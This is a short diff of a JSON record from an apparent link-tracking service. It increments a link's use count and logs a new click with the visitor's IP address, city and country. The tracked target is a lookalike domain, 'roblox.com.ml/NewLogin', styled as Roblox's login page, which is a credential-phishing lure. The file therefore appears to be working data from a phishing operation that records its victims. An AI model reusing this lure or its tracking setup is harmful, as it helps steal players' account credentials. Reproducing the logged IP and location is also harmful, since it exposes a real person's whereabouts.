@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 502,
+    "useCount": 503,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4123,6 +4123,14 @@
       },
       {
         "timestamp": 1777085375754,
+        "ip": "90.90.217.161",
+        "country": "France",
+        "city": "Paris",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777085396188,
         "ip": "90.90.217.161",
         "country": "France",
         "city": "Paris",
